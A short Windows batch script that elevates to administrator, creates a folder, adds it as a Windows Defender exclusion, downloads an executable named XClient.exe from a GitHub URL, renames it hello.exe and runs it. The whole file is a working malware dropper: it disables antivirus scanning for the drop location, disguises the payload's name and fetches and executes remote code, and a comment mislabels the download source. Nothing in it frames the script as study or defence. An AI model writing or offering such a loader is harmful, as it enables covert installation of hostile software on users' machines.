@echo off

REM Check if running with administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

REM Set folder path relative to the location of the batch file
set "folderPath=%~dp0safe"

REM Create the "safe" folder at the same location as the batch file
mkdir "%folderPath%"

REM Add the folder as an exclusion to Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"

REM Set the Google Drive direct download link
set "url=https://github.com/MyronAmr/main/raw/main/XClient.exe"

REM Set the name for the downloaded file
set "filename=hello.exe"

REM Download the file to the created folder using PowerShell
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%folderPath%\%filename%')"

REM Execute the downloaded file
start "" "%folderPath%\%filename%"
